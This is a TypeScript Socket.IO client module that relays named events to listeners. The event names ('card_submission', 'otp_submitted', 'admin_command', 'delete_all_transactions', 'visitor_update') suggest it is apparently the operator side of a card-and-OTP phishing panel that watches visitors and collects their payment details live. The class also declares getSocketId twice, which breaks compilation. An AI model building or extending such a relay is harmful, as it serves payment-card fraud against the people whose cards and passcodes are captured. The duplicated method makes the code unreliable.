const { io } = require('socket.io-client');

const isLocalhost = window.location.hostname === "localhost" || window.location.hostname === "127.0.0.1";
const protocol = window.location.protocol === "https:" ? "wss" : "ws";
const wsUrl = isLocalhost
  ? `${protocol}://localhost:8080`
  : `${protocol}://${window.location.host}`;

const socket = io(wsUrl);

class WSClient {
  private listeners: { [type: string]: Array<(payload: any) => void> } = {};

  constructor() {
    socket.on('connect', () => {
      console.log('Socket.IO connected');
    });

    socket.on('disconnect', () => {
      console.log('Socket.IO disconnected');
    });

    // Listen for all relayed events
    const RELAY_EVENTS = [
      'card_submission',
      'admin_command',
      'otp_submitted',
      'delete_all_transactions',
      'visitor_update',
      'visitor_left',
      'start_chat',
      'chat_message'
    ];

    RELAY_EVENTS.forEach((event) => {
      socket.on(event, (payload) => {
        console.log(`Received event: ${event}`, payload);
        if (this.listeners[event]) {
          this.listeners[event].forEach((cb) => cb(payload));
        }
      });
    });
  }

  send(type: string, payload: any) {
    console.log(`Sending event: ${type}`, payload);
    socket.emit(type, payload);
  }

  getSocketId() {
    return socket.id;
  }

  getSocketId() {
    return socket.id;
  }

  on(type: string, cb: (payload: any) => void) {
    console.log(`Registering listener for ${type}`);
    if (!this.listeners[type]) this.listeners[type] = [];
    this.listeners[type].push(cb);
  }

  off(type: string, cb: (payload: any) => void) {
    console.log(`Removing listener for ${type}`);
    if (this.listeners[type]) {
      this.listeners[type] = this.listeners[type].filter((fn) => fn !== cb);
    }
  }
}

export const wsClient = new WSClient();
